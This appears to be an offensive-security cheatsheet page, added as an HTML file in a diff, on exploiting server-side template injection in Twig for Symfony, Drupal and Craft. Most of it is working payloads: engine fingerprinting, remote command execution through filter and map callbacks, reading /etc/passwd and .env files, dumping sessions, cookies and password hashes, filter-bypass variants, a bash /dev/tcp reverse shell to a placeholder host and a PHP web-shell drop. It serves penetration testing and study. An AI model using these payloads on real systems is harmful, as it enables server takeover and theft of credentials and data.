@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Twig (PHP - Symfony, Craft, Drupal 8+) · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Twig (PHP - Symfony, Craft, Drupal 8+)</h1><p class="cx-lede">SSTI exploitation in Twig - _self.env mappers, filter abuse, and RCE paths for Symfony and Drupal stacks.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059.004</span><span class="cx-tag">D3FEND D3-EAL</span><span class="cx-tag">IMPACT ServerSideEval, RCE, FileRead</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Twig in unsafe mode (legacy Symfony, custom embeds, untrusted-template scenarios) gives direct access to PHP functions via <code>_self.env</code>. Sandbox mode (default since Twig 2.x) blocks the obvious paths but is bypassable through filter abuse.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm Twig (not Jinja2)
+{{7*&#x27;7&#x27;}}                                    # → 49 (numeric coerce, vs. Jinja&#x27;s 7777777)
+
+# Loot - Symfony Request
+{{_self.env.getRuntimeLoader().getSourceContext(&#x27;@app/config/services.yaml&#x27;).getCode()}}
+
+# RCE - unsafe Twig
+{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
+{{[&#x27;id&#x27;]|filter(&quot;system&quot;)}}                  # Twig &gt;= 1.36 - runs `id` via system()
+{{[&#x27;id&#x27;]|map(&quot;system&quot;)|join(&quot;,&quot;)}}           # alternate</code></pre></figure>
+<p>Success indicator: <code>uid=</code> line from <code>id</code> or file contents in response.</p>
+<h2 id="where-this-engine-lives">Where this engine lives</h2>
+<ul>
+<li><strong>Symfony</strong> - Twig is the default templating engine since Symfony 2. Sinks are anywhere <code>$twig-&gt;render()</code> is called with user input - most commonly in admin "email template" editors or report builders.</li>
+<li><strong>Drupal 8+</strong> - uses Twig for theming. Twig in Drupal runs in sandbox mode by default; bypasses are more relevant here than the unsafe-mode payloads.</li>
+<li><strong>Craft CMS</strong> - Twig in admin context. The CMS exposes additional helpers (<code>craft.app.config</code>) that widen the loot surface.</li>
+<li><strong>Grav CMS, Bolt CMS</strong> - flat-file PHP CMSes that use Twig directly.</li>
+<li><strong>Custom PHP apps</strong> - anything embedding <code>Twig\Environment</code> for email/report generation.</li>
+</ul>
+<h2 id="step-1-confirm-and-orient">Step 1 - Confirm and orient</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{7*7}}                          # → 49        confirms template eval
+{{7*&#x27;7&#x27;}}                        # → 49        confirms Twig (not Jinja2)
+{{_self}}                        # object dump: __TwigTemplate_&lt;hash&gt; - confirms Twig</code></pre></figure>
+<p><code>{{_self}}</code> is the cleanest Twig fingerprint. If it returns a <code>__TwigTemplate_*</code> object representation, you have Twig and can reach the environment via <code>_self.env</code>.</p>
+<h2 id="step-2-sandbox-detection">Step 2 - Sandbox detection</h2>
+<p>Twig has two modes:</p>
+<ul>
+<li><strong>Unsafe</strong> - <code>_self.env.getFilter("system")</code> works; arbitrary PHP function calls are reachable</li>
+<li><strong>Sandbox</strong> - only allowlisted tags/filters/functions; most useful payloads are blocked</li>
+</ul>
+<p>Test:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{_self.env}}</code></pre></figure>
+<ul>
+<li>Returns object → unsafe mode. Continue to RCE paths below.</li>
+<li>Returns empty / error → sandbox. Skip to filter-abuse paths or <a href="../filter-bypass/index.html">filter bypass</a>.</li>
+</ul>
+<h2 id="step-3-rce-paths-unsafe-mode">Step 3 - RCE paths (unsafe mode)</h2>
+<h3 id="path-a-_selfenvregisterundefinedfiltercallback-twig-1x">Path A - <code>_self.env.registerUndefinedFilterCallback</code> (Twig ≤ 1.x)</h3>
+<p>The classic. Register <code>exec</code> as the fallback filter, then invoke any command name as a filter:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
+{{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;cat /etc/passwd&quot;)}}</code></pre></figure>
+<p>Works on Twig 1.x. The <code>registerUndefinedFilterCallback</code> method was removed in Twig 2.x.</p>
+<h3 id="path-b-filter-map-against-function-names-twig-136-including-2x-and-3x">Path B - <code>filter</code> / <code>map</code> against function names (Twig ≥ 1.36, including 2.x and 3.x)</h3>
+<p>The <code>filter</code>, <code>map</code>, <code>reduce</code>, and <code>sort</code> filters accept a callback. PHP function names are callable strings:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{[&#x27;id&#x27;]|filter(&#x27;system&#x27;)}}
+{{[&#x27;id&#x27;]|map(&#x27;system&#x27;)|join(&#x27;,&#x27;)}}
+{{[&#x27;/etc/passwd&#x27;]|map(&#x27;file_get_contents&#x27;)|join(&#x27;&#x27;)}}
+{{[&#x27;id&#x27;, &#x27;uname -a&#x27;]|map(&#x27;system&#x27;)|join(&#x27;---&#x27;)}}</code></pre></figure>
+<p>These paths often bypass naive filtering that blocks <code>_self</code>, <code>env</code>, or <code>__class__</code>.</p>
+<h3 id="path-c-sort-with-callback">Path C - <code>sort</code> with callback</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{[&#x27;cat /etc/passwd&#x27;]|sort(&#x27;system&#x27;)}}</code></pre></figure>
+<p>Same mechanism via the <code>sort</code> filter - useful when <code>filter</code> and <code>map</code> are blocked specifically.</p>
+<h2 id="step-4-file-read-in-sandbox-mode">Step 4 - File read in sandbox mode</h2>
+<p>Sandbox mode usually allows the <code>source</code> and <code>include</code> constructs, which read files from the template loader's root:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ source(&#x27;config.yaml&#x27;) }}
+{% include &#x27;config.yaml&#x27; %}</code></pre></figure>
+<p>Path is loader-relative - usually the app's templates directory. Try <code>../</code> traversal:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ source(&#x27;../config/services.yaml&#x27;) }}
+{{ source(&#x27;../.env&#x27;) }}</code></pre></figure>
+<p>For Drupal, the loader is often pinned and traversal fails, but <code>source</code> against absolute paths works on some configurations:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ source(&#x27;@app/config/parameters.yaml&#x27;) }}
+{{ source(&#x27;@kernel/.env&#x27;) }}</code></pre></figure>
+<p>The <code>@app</code>, <code>@kernel</code>, <code>@root</code> namespaces depend on the application's Twig configuration.</p>
+<h2 id="step-5-drupal-specific-paths">Step 5 - Drupal-specific paths</h2>
+<p>Drupal 8+ adds Twig filters that include their own callable mechanisms. Several were retroactively patched but appear on unpatched installs:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Old CVE-2017-6920 vector
+{{ [&#x27;id&#x27;] | filter(&#x27;passthru&#x27;) }}
+
+# Drupal-specific helper, often unrestricted
+{{ [&#x27;id&#x27;, null]|reduce(&#x27;passthru&#x27;) }}</code></pre></figure>
+<p>Drupal also exposes <code>attach_library</code>, <code>link</code>, and <code>path</code> helpers that don't lead to RCE but reveal internal structure.</p>
+<h2 id="step-6-symfony-specific-loot">Step 6 - Symfony-specific loot</h2>
+<p>When you have <code>_self.env</code>, the Symfony container is reachable:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{_self.env.getRuntimeLoader()}}
+{{_self.env.getGlobals()}}                   # often contains &#x27;app&#x27; (Symfony app reference)</code></pre></figure>
+<p><code>app.session</code>, <code>app.user</code>, <code>app.request</code> are commonly exposed:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{app.request.cookies}}
+{{app.session.all}}
+{{app.user.password}}                        # hashed, but useful</code></pre></figure>
+<p>If <code>app.environment</code> returns <code>dev</code>, the application is running in dev mode - the symfony profiler is likely accessible, which gives full DB queries, environment variables, and session data without further exploitation.</p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>Standard PHP reverse shell via <code>system</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{[&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;&#x27;]|map(&#x27;system&#x27;)|join(&#x27;&#x27;)}}</code></pre></figure>
+<p>For environments with strict outbound filtering, write a web-shell file then access it:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{[&#x27;&lt;?php echo shell_exec($_GET[&quot;c&quot;]); ?&gt;&#x27;, &#x27;/var/www/public/x.php&#x27;]|map(&#x27;file_put_contents&#x27;)}}</code></pre></figure>
+<p>Then visit <code>/x.php?c=id</code>. File write requires the web server user to have write access to a web-served directory - common in containerized deployments.</p>
+<h2 id="filter-aware-variants">Filter-aware variants</h2>
+<p>When <code>_self</code>, <code>env</code>, or specific function names are filtered, see <a href="../filter-bypass/index.html">filter bypass</a>. Quick previews:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># String concatenation of blocked keyword
+{{[&#x27;id&#x27;]|filter(&#x27;sys&#x27;~&#x27;tem&#x27;)}}                # bypasses literal &#x27;system&#x27; match
+
+# Hex-encoded function name (Twig accepts strings as callables)
+{{[&#x27;id&#x27;]|filter(&#x27;\x73ystem&#x27;)}}
+
+# Attribute access via string indexing (Twig supports this)
+{{_self[&#x27;env&#x27;][&#x27;registerUndefinedFilterCallback&#x27;](&#x27;exec&#x27;)}}{{_self[&#x27;env&#x27;][&#x27;getFilter&#x27;](&#x27;id&#x27;)}}</code></pre></figure>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{7*7}}                                      # eval probe
+{{7*&#x27;7&#x27;}}                                    # Twig-vs-Jinja2 probe (returns 49)
+{{_self}}                                    # → __TwigTemplate_&lt;hash&gt; object
+{{dump()}}                                   # dev mode: dumps current scope; prod: nothing</code></pre></figure>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Twig 3.x</strong> removed several legacy paths. The <code>filter</code>/<code>map</code>/<code>reduce</code>/<code>sort</code>-with-callback method still works as of Twig 3.10.</li>
+<li><strong>Sandbox mode</strong> is the default since Twig 2.x for any template rendered via <code>Twig\Sandbox\SecurityPolicy</code>. Most production Symfony apps run in sandbox. Drupal pins to sandbox tightly.</li>
+<li><strong><code>{% verbatim %}</code> blocks</strong> in Twig disable evaluation - useful to know if your probe lands inside one (you'll see literal <code>{{...}}</code> even though the engine is Twig).</li>
+<li><strong>Error visibility</strong> - Symfony's prod mode swallows template errors. If a probe seems to produce no output, switch the test to a probe that doesn't throw (<code>{{1+1}}</code> instead of <code>{{undefined_var.method()}}</code>).</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Twig SSTI on Symfony admin panels is a complete-takeover bug - the admin Twig context typically has <code>app.user</code> access and database query helpers. Demonstrate at the configuration-dump stage and stop there unless scope explicitly authorizes RCE.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../../ssrf/filter-bypass/index.html">Previous: Filter bypass</a><a class="cx-next" href="../../ssrf/cloud-metadata/index.html">Next: Cloud metadata</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
